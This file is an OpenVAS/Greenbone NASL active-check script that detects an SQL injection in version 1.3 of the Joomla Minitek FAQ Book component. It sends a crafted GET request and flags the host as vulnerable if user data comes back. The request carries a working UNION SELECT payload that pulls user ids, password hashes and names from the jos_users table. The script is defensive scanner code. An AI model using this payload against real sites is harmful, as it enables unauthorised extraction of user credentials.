# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802106");
  script_version("2022-06-03T08:34:33+0000");
  script_tag(name:"last_modification", value:"2022-06-03 08:34:33 +0000 (Fri, 03 Jun 2022)");
  script_tag(name:"creation_date", value:"2011-06-20 15:22:27 +0200 (Mon, 20 Jun 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Joomla Minitek FAQ Book SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"summary", value:"Joomla Minitek FAQ Book component is prone to an SQL injection
  (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to input passed via the 'id' parameter to
  index.php' (when 'option' is set to 'com_faqbook' and 'view' is set to 'category') is not
  properly sanitised before being used in a SQL query.");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL
  queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"Joomla Minitek FAQ Book component version 1.3.");

  script_tag(name:"solution", value:"Update to version 1.4 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48223");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/102195/joomlafaqbook-sql.txt");
  script_xref(name:"URL", value:"http://www.exploit-id.com/web-applications/joomla-component-minitek-faq-book-sql-injection");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

req = http_get(item: dir + "/index.php", port: port);
res = http_keepalive_send_recv(port: port, data: req);

cookie = eregmatch(pattern: "Set-Cookie: ([a-zA-Z0-9=]+).*", string: res);

if (isnull(cookie[1]))
  cookie = "bce47a007c8b2cf96f79c7a0d154a9be=399e73298f66054c1a66858050b785bf";
else
  cookie = cookie[1];

useragent = http_get_user_agent();
host = http_host_name(port: port);

url = dir + "/index.php?option=com_faqbook&view=category" +
            "&id=-7+union+select+1,2,3,4,5,6,7,8,concat_ws(0x3a,0x72616e645f75736572," +
            "id,password,0x72616e645f75736572,name),10,11,12,13,14,15,16,17,18,19," +
            "20,21,22,23,24,25,26+from+jos_users--";

req = string("GET ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Cookie: ", cookie , "; path=/", "\r\n\r\n");
res = http_keepalive_send_recv(port: port, data: req);

if (egrep(string: res, pattern: "rand_user:[0-9]+:(.+):rand_user")) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
